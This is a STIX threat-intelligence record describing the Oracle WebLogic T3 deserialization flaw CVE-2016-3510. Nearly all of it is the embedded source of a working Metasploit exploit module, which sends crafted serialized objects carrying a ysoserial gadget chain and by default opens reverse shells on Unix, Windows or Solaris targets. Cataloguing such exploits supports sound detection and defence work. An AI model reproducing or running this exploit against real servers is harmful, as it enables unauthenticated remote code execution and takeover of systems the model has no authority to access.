{
    "type": "attack-pattern",
    "spec_version": "2.1",
    "id": "attack-pattern--e683a01a-9015-4a0f-ab72-51d9650ed9b8",
    "created": "2024-08-14T17:06:51.571823Z",
    "modified": "2024-08-14T17:06:51.571827Z",
    "name": "Oracle Weblogic Server Deserialization RCE - MarshalledObject",
    "description": " An unauthenticated attacker with network access to the Oracle Weblogic Server T3 interface can send a serialized object (weblogic.corba.utils.MarshalledObject) to the interface to execute code on vulnerable hosts. ",
    "external_references": [
        {
            "source_name": "metasploit",
            "url": "https://github.com/rapid7/metasploit-framework/blob/master/exploits/multi/misc/weblogic_deserialize_marshalledobject.rb",
            "external_id": "weblogic_deserialize_marshalledobject.rb"
        },
        {
            "source_name": "CVE",
            "external_id": "2016-3510"
        }
    ],
    "x_code_snippet": "##\n# This module requires Metasploit: https://metasploit.com/download\n# Current source: https://github.com/rapid7/metasploit-framework\n##\n\n\nclass MetasploitModule < Msf::Exploit::Remote\n  Rank = ManualRanking\n\n  include Msf::Exploit::Remote::Tcp\n  include Msf::Exploit::JavaDeserialization\n\n  def initialize(info={})\n    super(update_info(info,\n      'Name' => 'Oracle Weblogic Server Deserialization RCE - MarshalledObject',\n      'Description' => %q{\n        An unauthenticated attacker with network access to the Oracle Weblogic Server T3\n        interface can send a serialized object (weblogic.corba.utils.MarshalledObject)\n        to the interface to execute code on vulnerable hosts.\n      },\n      'Author' =>\n        [\n        'Andres Rodriguez',  # Metasploit Module - 2Secure (@acamro, acamro[at]gmail.com)\n        'Jacob Baines',      # Vulnerability Discovery - Tenable Network Security\n        'Aaron Soto',        # Reverse Engineering JSO and ysoserial blobs\n        'Steve Embling'      # T3S support\n        ],\n      'License' => MSF_LICENSE,\n      'References' =>\n        [\n          ['CVE', '2016-3510']\n        ],\n      'Privileged' => false,\n      'Platform' => %w{ unix win solaris },\n      'Targets' =>\n        [\n          [ 'Unix',\n            'Platform' => 'unix',\n            'Arch' => ARCH_CMD,\n            'DefaultOptions' => {'PAYLOAD' => 'cmd/unix/reverse_python'},\n            'Payload' => {\n              'Compat' => {'PayloadType' => 'cmd'}\n            }\n          ],\n          [ 'Windows',\n            'Platform' => 'win',\n            'Payload' => {},\n            'DefaultOptions' => {'PAYLOAD' => 'windows/meterpreter/reverse_tcp'}\n          ],\n          [ 'Solaris',\n            'Platform' => 'solaris',\n            'Arch' => ARCH_CMD,\n            'DefaultOptions' => {'PAYLOAD' => 'cmd/unix/reverse_perl'},\n            'Payload' => {\n              'Space'       => 2048,\n              'DisableNops' => true,\n              'Compat'      =>\n                {\n                  'PayloadType' => 'cmd',\n                  'RequiredCmd' => 'generic perl telnet',\n                }\n            }\n          ]\n        ],\n      'DefaultTarget' => 0,\n      'DefaultOptions' => { 'WfsDelay' => 12 },\n      'DisclosureDate' => '2016-07-19',\n      'Notes' => {\n        'Reliability' => [REPEATABLE_SESSION],\n        'Stability' => [CRASH_SAFE],\n        'SideEffects' => [IOC_IN_LOGS]\n      }))\n\n      register_options([\n        Opt::RPORT(7001),\n      ])\n\n      register_advanced_options([\n        OptBool.new('FORCE_T3', [false, 'Force T3 protocol even over SSL', false])\n      ])\n  end\n\n=begin   This check is currently incompatible with the Tcp mixin.  :-(\n  def check\n    resp = send_request_cgi(\n      'method' => 'GET',\n      'uri'    => '/console/login/LoginForm.jsp'\n    )\n\n    return CheckCode::Unknown unless resp && resp.code == 200\n\n    unless resp.body.include?('Oracle WebLogic Server Administration Console')\n      vprint_warning(\"Oracle WebLogic Server banner cannot be found\")\n      return CheckCode::Unknown\n    end\n\n    /WebLogic Server Version: (?<version>\\d+\\.\\d+\\.\\d+\\.\\d*)/ =~ resp.body\n    unless version\n      vprint_warning(\"Oracle WebLogic Server version cannot be found\")\n      return CheckCode::Unknown\n    end\n\n    version = Rex::Version.new(version)\n    vprint_good(\"Detected Oracle WebLogic Server Version: #{version}\")\n    case\n    when version.to_s.start_with?('10.3')\n      return CheckCode::Appears unless version > Rex::Version.new('10.3.6.0')\n    when version.to_s.start_with?('12.1.3')\n      return CheckCode::Appears unless version > Rex::Version.new('12.1.3.0')\n    when version.to_s.start_with?('12.2')\n      return CheckCode::Appears unless version > Rex::Version.new('12.2.1.0')\n    end\n\n    return CheckCode::Safe\n  end\n=end\n\n  def t3_handshake\n    # retrieved from network traffic\n    if !datastore['SSL'] || datastore['FORCE_T3']\n      shake = 't3'\n    else\n      shake = 't3s'\n    end\n    shake << \" 12.2.1\\n\"\n    shake << \"AS:255\\n\"\n    shake << \"HL:19\\n\"\n    shake << \"MS:10000000\\n\\n\"\n\n    sock.put(shake)\n    sleep(1)\n    sock.get_once\n  end\n\n  def build_t3_request_object\n    # T3 request serialized data\n    # retrieved by watching network traffic\n    # This is a proprietary, undocumented protocol\n    # TODO: WHAT DOES THIS DO?  CAN WE RANDOMIZE ANY OF IT?\n    data =  '000005c3016501ffffffffffffffff0000006a0000ea600000001900937b484a'\n    data << '56fa4a777666f581daa4f5b90e2aebfc607499b4027973720078720178720278'\n    data << '700000000a000000030000000000000006007070707070700000000a00000003'\n    data << '0000000000000006007006'\n\n    data << 'fe010000'                                     # ----- separator -----\n\n    data << 'aced0005'                                     # JSO v5 header\n    data << '73'                                           # object header\n    data << '72001d'                                       # className (29 bytes):\n    data << '7765626c6f6769632e726a766d2e436c617373'       #   weblogic.rjvm.ClassTableEntry\n    data << '5461626c65456e747279'                         #   (continued)\n    data << '2f52658157f4f9ed'                             #   serialVersionUID\n    data << '0c00007870'                                   #   remainder of object header\n    data << '72'                                           # object header\n    data << '00247765626c6f6769632e636f6d6d6f6e2e696e74'   #   className (36 bytes): weblogic.common.internal.PackageInfo\n    data << '65726e616c2e5061636b616765496e666f'           #   (continued)\n    data << 'e6f723e7b8ae1ec9'                             #   serialVersionUID\n    data << '02'                                           #   SC_SERIALIZABLE\n    data << '0008'                                         #   fieldCount = 8\n    data << '4900056d616a6f72'                             #     0: Int: major\n    data << '4900056d696e6f72'                             #     1: Int: minor\n    data << '49000c726f6c6c696e675061746368'               #     2: Int rollingPatch\n    data << '49000b736572766963655061636b'                 #     3: Int: servicePack\n    data << '5a000e74656d706f726172795061746368'           #     4: Bool: temporaryPatch\n    data << '4c0009696d706c5469746c65'                     #     5: Obj: implTitle\n    data << '7400124c6a6176612f6c616e672f537472696e673b'   #        java/lang/String\n    data << '4c000a696d706c56656e646f72'                   #     6: Obj: implVendor\n    data << '71007e0003'                                   #        (Handle) 0x007e0003\n    data << '4c000b696d706c56657273696f6e'                 #     7: Obj: implVersion\n    data << '71007e0003'                                   #        (Handle) 0x007e0003\n    data << '78707702000078'                               #   block footers\n\n    data << 'fe010000'                                     # ----- separator -----\n\n    data << 'aced0005'                                     # JSO v5 header\n    data << '7372'                                         # object header\n    data << '001d7765626c6f6769632e726a766d2e436c6173'     # className (29 bytes): weblogic.rjvm.ClassTableEntry\n    data << '735461626c65456e747279'                       #    (continued)\n    data << '2f52658157f4f9ed'                             # serialVersionUID\n    data << '0c'                                           # EXTERNALIZABLE | BLOCKDATA\n    data << '00007870'                                     # remainder of object header\n    data << '72'                                           # object header\n    data << '00247765626c6f6769632e636f6d6d6f6e2e696'      # className (36 bytes): weblogic.common.internal.VersionInfo\n    data << 'e7465726e616c2e56657273696f6e496e666f'        #    (continued)\n    data << '972245516452463e'                             # serialVersionUID\n    data << '02'                                           # SC_SERIALIZABLE\n    data << '0003'                                         #   fieldCount = 3\n    data << '5b0008'                                       #   array header (8 bytes)\n    data << '7061636b61676573'                             #     ARRAY NAME = 'packages'\n    data << '740027'                                       #     TC_STRING className1 (39 bytes)\n    data << '5b4c7765626c6f6769632f636f6d6d6f6e2f69'       #       weblogic/common/internal/PackageInfo\n    data << '6e7465726e616c2f5061636b616765496e666f'       #       (continued)\n    data << '3b'                                           #       (continued)\n    data << '4c000e'                                       #   object header (14 bytes)\n    data << '72656c6561736556657273696f6e'                 #     releaseVersion\n    data << '740012'                                       #     TC_STRING (18 bytes)\n    data << '4c6a6176612f6c616e672f537472696e673b'         #       versionInfoAsBytes\n    data << '5b0012'                                       #   array header (18 bytes)\n    data << '76657273696f6e496e666f41734279746573'         #     ARRAY NAME = java/lang/String;\n    data << '740002'                                       #     TC_STRING (2 bytes)\n    data << '5b42'                                         #       0x5b42 = [B\n    data << '78'                                           # block footer\n\n    data << '720024'                                       # class (36 bytes)\n    data << '7765626c6f6769632e636f6d6d6f6e2e696e'         #   weblogic.common.internal.PackageInfo\n    data << '7465726e616c2e5061636b616765496e666f'         #   (continued)\n    data << 'e6f723e7b8ae1ec9'                             #   serialVersionUID\n\n    data << '02'                                           #   SC_SERIALIZABLE\n    data << '0008'                                         #   fieldCount = 8\n    data << '4900056d616a6f72'                             #   0: Int: major\n    data << '4900056d696e6f72'                             #   1: Int: minor\n    data << '49000c726f6c6c696e675061746368'               #   2: Int rollingPatch\n    data << '49000b736572766963655061636b'                 #   3: Int: servicePack\n    data << '5a000e74656d706f726172795061746368'           #   4: Bool: temporaryPatch\n    data << '4c0009696d706c5469746c65'                     #   5: Obj: implTitle\n    data << '71'                                           #      TC_REFERENCE\n    data << '007e0004'                                     #      Handle = 0x007e0004\n    data << '4c000a696d706c56656e646f72'                   #   6: Obj: implVendor\n    data << '71'                                           #      TC_REFERENCE\n    data << '007e0004'                                     #      Handle = 0x007e0004\n    data << '4c000b696d706c56657273696f6e'                 #   7: Obj: implVersion\n    data << '71'                                           #      TC_REFERENCE\n    data << '007e0004'                                     #      Handle = 0x007e0004\n    data << '78'                                           # class footer\n    data << '70'                                           # TC_NULL\n    data << '77020000'                                     # BLOCKDATA (2 bytes): 0x0000\n    data << '78'                                           # block footer\n\n    data << 'fe010000'                                     # ----- separator -----\n\n    data << 'aced0005'                                     # JSO v5 header\n    data << '73'                                           # object header\n    data << '72001d'                                       # className (29 bytes):\n    data << '7765626c6f6769632e726a766d2e436c617373'       #   weblogic.rjvm.ClassTableEntry\n    data << '5461626c65456e747279'                         #   (continued)\n    data << '2f52658157f4f9ed'                             #   serialVersionUID\n    data << '0c00007870'                                   #   remainder of object header\n    data << '720021'                                       # className (33 bytes)\n    data << '7765626c6f6769632e636f6d6d6f6e2e696e74'       #   weblogic.common.internal.PeerInfo\n    data << '65726e616c2e50656572496e666f'                 #   (continued)\n    data << '585474f39bc908f1'                             #   serialVersionUID\n    data << '02'                                           #   SC_SERIALIZABLE\n    data << '0006'                                         #   fieldCount = 6\n    data << '4900056d616a6f72'                             #     0: Int: major\n    data << '4900056d696e6f72'                             #     1: Int: minor\n    data << '49000c726f6c6c696e675061746368'               #     2: Int rollingPatch\n    data << '49000b736572766963655061636b'                 #     3: Int: servicePack\n    data << '5a000e74656d706f726172795061746368'           #     4: Bool: temporaryPatch\n    data << '5b00087061636b61676573'                       #     5: Array: packages\n    data << '740027'                                       #        TC_STRING (39 bytes)\n    data << '5b4c7765626c6f6769632f636f6d6d6f6e2f69'       #        Lweblogic/common/internal/PackageInfo;\n    data << '6e7465726e616c2f5061636b616765496e666f'       #        (continued)\n    data << '3b'                                           #        (continued)\n    data << '78'                                           # block footer\n    data << '720024'                                       # class (36 bytes)\n    data << '7765626c6f6769632e636f6d6d6f6e2e696e74'       #   Lweblogic/common/internal/PackageInfo;\n    data << '65726e616c2e56657273696f6e496e666f'           #   (continued)\n    data << '972245516452463e'                             #   serialVersionUID\n    data << '02'                                           #   SC_SERIALIZABLE\n    data << '0003'                                         #   fieldCount = 3\n    data << '5b0008'                                       #   0: Array\n    data << '7061636b6167657371'                           #      packages\n    data << '007e0003'                                     #      Handle = 0x00730003\n    data << '4c000e72656c6561736556657273696f6e'           #   1: Obj: releaseVersion\n    data << '7400124c6a6176612f6c616e672f537472696e673b'   #      Ljava/lang/String;\n    data << '5b001276657273696f6e496e666f41734279746573'   #   2: Array: versionInfoAsBytes\n    data << '740002'                                       #      TC_STRING (2 bytes)\n    data << '5b42'                                         #      VALUE = 0x5b42 = [B\n    data << '78'                                           # block footer\n    data << '720024'                                       # class: (36 bytes)\n    data << '7765626c6f6769632e636f6d6d6f6e2e696e746572'   #   Name = weblogic.common.internal.PackageInfo\n    data << '6e616c2e5061636b616765496e666f'               #   (continued)\n    data << 'e6f723e7b8ae1ec9'                             #   serialVersionUID\n    data << '02'                                           #   SC_SERIALIZABLE\n    data << '0008'                                         #   fieldCount = 8\n    data << '4900056d616a6f72'                             #   0: Int: major\n    data << '4900056d696e6f72'                             #   1: Int: minor\n    data << '49000c726f6c6c696e675061746368'               #   2: Int rollingPatch\n    data << '49000b736572766963655061636b'                 #   3: Int: servicePack\n    data << '5a000e74656d706f726172795061746368'           #   4: Bool: temporaryPatch\n    data << '4c0009696d706c5469746c65'                     #   5: Obj: implTitle\n    data << '71'                                           #      TC_REFERENCE\n    data << '007e0005'                                     #      Handle = 0x007e0005\n    data << '4c000a696d706c56656e646f72'                   #   6: Obj: implVendor\n    data << '71'                                           #      TC_REFERENCE\n    data << '007e0005'                                     #      Handle = 0x007e0005\n    data << '4c000b696d706c56657273696f6e'                 #   7: Obj: implVersion\n    data << '71'                                           #      TC_REFERENCE\n    data << '007e0005'                                     #      Handle = 0x007e0005\n    data << '78'                                           # class footer\n    data << '707702000078'                                 # block footers\n\n    data << 'fe00ff'                                       # this cruft again.  some kind of footer\n\n    data << 'fe010000'                                     # ----- separator -----\n\n    # weblogic.rjvm.JVMID object\n    data << 'aced0005'                                     # JSO v5 header\n    data << '73'                                           # object header\n    data << '720013'                                       #   class (19 bytes)\n    data << '7765626c6f6769632e726a766d2e4a564d4944'       #   name = 'weblogic.rjvm.JVMID'\n    data << 'dc49c23ede121e2a'                             #   serialVersionUID\n    data << '0c'                                           #   EXTERNALIZABLE | BLOCKDATA\n    data << '0000'                                         #   fieldCount = 0   (!!!)\n    data << '78'                                           # block footer\n    data << '70'                                           # NULL\n    data << '7750'                                         # block header (80 bytes)\n    data << '21'                                           #   !\n    data << '000000000000000000'                           #   9 NULL BYTES\n    data << '0d'                                           #   \\n\n    data << '3139322e3136382e312e323237'                         #   192.168.1.227\n    data << '00'                                           #   \\0\n    data << '12'                                           #      #TODO: UNKNOWN\n    data << '57494e2d4147444d56515542315436'               #   WIN-AGDMVQUB1T6\n    data << '2e'                                           #      #TODO: UNKNOWN\n    data << '656883348cd6000000070000'                     #      #TODO: UNKNOWN\n    data << rport.to_s(16).rjust(4, '0')                   #   callback port\n    data << 'ffffffffffffffffffffffffffffffffffffff'       #      #TODO: UNKNOWN\n    data << 'ffffffffff'                                   #      #TODO: UNKNOWN\n    data << '78'                                           # block footer\n\n    data << 'fe010000'                                     # ----- separator -----\n\n    # weblogic.rjvm.JVMID object\n    data << 'aced0005'                                     # JSO v5 header\n    data << '73'                                           # object header\n    data << '72'                                           #   class\n    data << '00137765626c6f6769632e726a766d2e4a564d4944'   #   Name: weblogic.rjvm.JVMID\n    data << 'dc49c23ede121e2a'                             #   serialVersionUID\n    data << '0c'                                           #   EXTERNALIZABLE | BLOCKDATA\n    data << '0000'                                         #   fieldCount = 0\n    data << '78'                                           # end block\n    data << '70'                                           # TC_NULL\n    data << '77'                                           # block header\n    data << '20'                                           #   length = 32 bytes\n    data << '0114dc42bd071a772700'                         #      #TODO: UNKNOWN\n    data << '0d'                                           #      \\n\n    data << '3234322e3231342e312e323534'                   #      242.214.1.254\n    data << '61863d1d'                                     #      #TODO: UNKNOWN\n    data << '00000000'                                     #      NULL BYTES\n    data << '78'                                           # block footer\n\n    sock.put([data].pack('H*'))\n    sleep(1)\n    sock.get_once\n  end\n\n  def send_payload_objdata\n    # basic weblogic ClassTableEntry object (serialized)\n    # TODO: WHAT DOES THIS DO?  CAN WE RANDOMIZE ANY OF IT?\n    objdata = '056508000000010000001b0000005d0101007372017870737202787000000000'\n    objdata << '00000000757203787000000000787400087765626c6f67696375720478700000'\n    objdata << '000c9c979a9a8c9a9bcfcf9b939a7400087765626c6f67696306'\n\n    objdata << 'fe010000'                                  # ----- separator -----\n\n    objdata << 'aced0005'                                  # JSO v5 header\n    objdata << '73'                                        # object header\n    objdata << '72'                                        #   class\n    objdata << '001d7765626c6f6769632e726a766d2e436c61'    #   Name: weblogic.rjvm.ClassTableEntry\n    objdata << '73735461626c65456e747279'                  #   (cont)\n    objdata << '2f52658157f4f9ed'                          #   serialVersionUID\n    objdata << '0c'                                        #   EXTERNALIZABLE | BLOCKDATA\n    objdata << '0000'                                      #   fieldCount = 0\n    objdata << '7870'                                      #   remaining object header\n    objdata << '72'                                        # class header\n    objdata << '00025b42'                                  #   Name: 0x5b42\n    objdata << 'acf317f8060854e0'                          #   serialVersionUID\n    objdata << '02'                                        #   SERIALIZABLE\n    objdata << '0000'                                      #   fieldCount = 0\n    objdata << '7870'                                      #   class footer\n    objdata << '77'                                        # block header\n    objdata << '020000'                                    #   contents = 0x0000\n    objdata << '78'                                        #   block footer\n\n    objdata << 'fe010000'                                  # ----- separator -----\n\n    objdata << 'aced0005'                                  # JSO v5 header\n    objdata << '73'                                        # object header\n    objdata << '72'                                        #   class\n    objdata << '001d7765626c6f6769632e726a766d2e436c61'    #   Name: weblogic.rjvm.ClassTableEntry\n    objdata << '73735461626c65456e747279'                  #   (cont)\n    objdata << '2f52658157f4f9ed'                          #   serialVersionUID\n    objdata << '0c'                                        #   EXTERNALIZABLE | BLOCKDATA\n    objdata << '0000'                                      #   fieldCount = 0\n    objdata << '7870'                                      #   remaining object header\n    objdata << '72'                                        # class header\n\n    objdata << '00135b4c6a6176612e6c616e672e4f626a'        #   Name: [Ljava.lang.Object;\n    objdata << '6563743b'                                  #   (cont)\n    objdata << '90ce589f1073296c'                          #   serialVersionUID\n    objdata << '02'                                        #   SERIALIZABLE\n    objdata << '0000'                                      #   fieldCount = 0\n    objdata << '7870'                                      #   remaining object header\n    objdata << '77'                                        # block header\n    objdata << '020000'                                    #   contents = 0x0000\n    objdata << '78'                                        #   block footer\n\n    objdata << 'fe010000'                                  # ----- separator -----\n\n    objdata << 'aced0005'                                  # JSO v5 header\n    objdata << '73'                                        # object header\n    objdata << '72'                                        #   class\n\n    objdata << '001d7765626c6f6769632e726a766d2e436c61'    #   Name: weblogic.rjvm.ClassTableEntry\n    objdata << '73735461626c65456e747279'                  #   (cont)\n    objdata << '2f52658157f4f9ed'                          #   serialVersionUID\n    objdata << '0c'                                        #   SERIALIZABLE | BLOCKDATA\n    objdata << '0000'                                      #   fieldCount = 0\n    objdata << '7870'                                      #   block footer\n    objdata << '72'                                        # class header\n    objdata << '00106a6176612e7574696c2e566563746f72'      #   Name: java.util.Vector\n    objdata << 'd9977d5b803baf01'                          #   serialVersionUID\n    objdata << '03'                                        #   WRITE_METHOD | SERIALIZABLE\n    objdata << '0003'                                      #   fieldCount = 3\n    objdata << '4900116361706163697479496e6372656d656e74'  #   0: Int: capacityIncrement\n    objdata << '49000c656c656d656e74436f756e74'            #   1: Int: elementCount\n    objdata << '5b000b656c656d656e7444617461'              #   2: Array: elementData\n    objdata << '7400135b4c6a6176612f6c616e672f4f626a6563'  #   3: String: [Ljava/lang/Object;\n    objdata << '743b'                                      #      (cont)\n    objdata << '7870'                                      #   remaining object header\n    objdata << '77'                                        # block header\n    objdata << '020000'                                    #   contents = 0x0000\n    objdata << '78'                                        #   block footer\n\n    objdata << 'fe010000'                                  # ----- separator -----\n\n    # payload generated from ysoserial and wrapped in a MarshalledObject:\n    objdata << 'aced0005'                                  # JSO v5 header\n    objdata << '73'                                        # object header\n    objdata << '72'                                        #   class header\n\n    objdata << '00257765626c6f6769632e636f7262612e757469'  #     Name = weblogic.corba.utils.MarshalledObject\n    objdata << '6c732e4d61727368616c6c65644f626a656374'    #       (cont)\n    objdata << '592161d5f3d1dbb6'                          #     serialVersionUID\n    objdata << '02'                                        #     SERIALIZABLE\n    objdata << '0002'                                      #     fieldCount = 2\n    objdata << '49000468617368'                            #     0: Int: hash\n    objdata << '5b00086f626a4279746573'                    #     1: Array: objBytes\n    objdata << '7400025b42'                                #        Value: 0x5b42\n    objdata << '7870'                                      #     class footer\n                                                           #   class Data:\n    objdata << '21210fdc'                                  #     hash = 0x21210fdc (555814876d)\n    objdata << '757200025b42'                              #     objBytes = [ 0x5b42 ]\n    objdata << 'acf317f8060854e0'                          #     serialVersionUID\n    objdata << '02'                                        #     SERIALIZABLE\n    objdata << '0000'                                      #     fieldCount = 0\n    objdata << '7870'                                      #   class footer\n    objdata << '0000'                                      #   arraySize (first two bytes)\n\n    # java -jar ysoserial-0.0.5-all.jar CommonsCollections1 calc.exe\n    java_payload = generate_java_deserialization_for_payload('CommonsCollections1', payload)\n    objdata << (java_payload.length).to_s(16).rjust(4, '0')# arraySize (lower two bytes)\n    objdata << java_payload.each_byte.map { |b| b.to_s(16).rjust(2,'0') }.join\n\n    # basic weblogic ImmutableServiceContext object (serialized)\n    objdata << 'fe010000'                                  # ----- separator -----\n\n    objdata << 'aced0005'                                  # JSO v5 header\n    objdata << '73'                                        # object header\n    objdata << '72'                                        #   class\n    objdata << '00257765626c6f6769632e726a766d2e496d6d75'  #   Name = weblogic.rjvm.ImmutableServiceContext\n    objdata << '7461626c6553657276696365436f6e74657874'    #     (cont)\n    objdata << 'ddcba8706386f0ba'                          #   serialVersionUID\n    objdata << '0c'                                        #   SERIALIZABLE | BLOCKDATA\n    objdata << '0000'                                      #   fieldCount = 0\n    objdata << '78'                                        #   remainder of object header\n    objdata << '72'                                        # class header\n    objdata << '00297765626c6f6769632e726d692e70726f7669'  #   Name: weblogic.rmi.provider.BasicServiceContext\n    objdata << '6465722e426173696353657276696365436f6e74'  #     (cont)\n    objdata << '657874'                                    #     (cont)\n    objdata << 'e4632236c5d4a71e'                          #    serialVersionUID\n    objdata << '0c'                                        #    SERIALIZABLE | BLOCKDATA\n    objdata << '0000'                                      #    fieldCount = 0\n    objdata << '78'                                        #    block footer\n    objdata << '70'                                        #    TC_NULL\n    objdata << '77'                                        #  block header\n    objdata << '020600'                                    #    Contents: 0x0600 (1536d) ### LENGTH OFFSET ADDED BELOW  #TODO: WHY?\n    objdata << '73'                                        #    object header\n    objdata << '72'                                        #      class description\n    objdata << '00267765626c6f6769632e726d692e696e746572'  #        Name = weblogic.rmi.internal.MethodDescriptor\n    objdata << '6e616c2e4d6574686f6444657363726970746f72'  #          (cont)\n    objdata << '12485a828af7f67b'                          #        serialVersionUID\n    objdata << '0c'                                        #    EXTERNALIZABLE | BLOCKDATA\n    objdata << '0000'                                      #    fieldCount = 0\n    objdata << '78'                                        #    block footer\n    objdata << '70'                                        #    TC_NULL\n    objdata << '77'                                        #  block header\n    objdata << '34002e61757468656e746963617465284c776562'  #   HEX-ASCII: authenticate(Lweblogic.security.acl.UserInfo;)\n    objdata << '6c6f6769632e73656375726974792e61636c2e55'  #     (cont)\n    objdata << '736572496e666f3b290000001b'                #     (cont)\n    objdata << '78'                                        #   block footer\n    objdata << '78'                                        # object footer\n\n    objdata << 'fe00ff'                                    # this cruft again.  some kind of footer\n\n    # sets the length of the stream\n    data = ((objdata.length >> 1) + 4).to_s(16).rjust(8,'0')\n    data << objdata\n\n    sock.put([data].pack('H*'))\n    sleep(1)\n    sock.get_once\n  end\n\n  def exploit\n    connect\n\n    print_status('Sending handshake...')\n    t3_handshake\n\n    print_status('Sending T3 request object...')\n    build_t3_request_object\n\n    print_status('Sending client object payload...')\n    send_payload_objdata\n\n    handler\n    disconnect\n  end\nend\n",
    "x_mitre_disclosure_date": "2016-07-19",
    "x_mitre_platforms": [
        "solaris'"
    ]
}